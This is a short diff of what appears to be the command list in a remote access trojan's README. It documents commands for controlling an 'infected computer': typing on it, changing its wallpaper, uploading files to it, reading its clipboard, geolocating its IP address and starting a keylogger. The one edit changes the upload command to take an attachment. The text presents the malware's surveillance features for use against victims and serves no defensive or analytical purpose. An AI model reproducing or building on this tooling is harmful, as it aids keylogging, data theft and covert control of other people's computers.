@@ -35,7 +35,7 @@ Availaible commands are :
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
 --> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
---> !upload = Upload file from website to computer / Syntax = "!upload exemple.com name=file.png" (without quotation mark)
+--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map
 --> !startkeylogger = Starts a keylogger
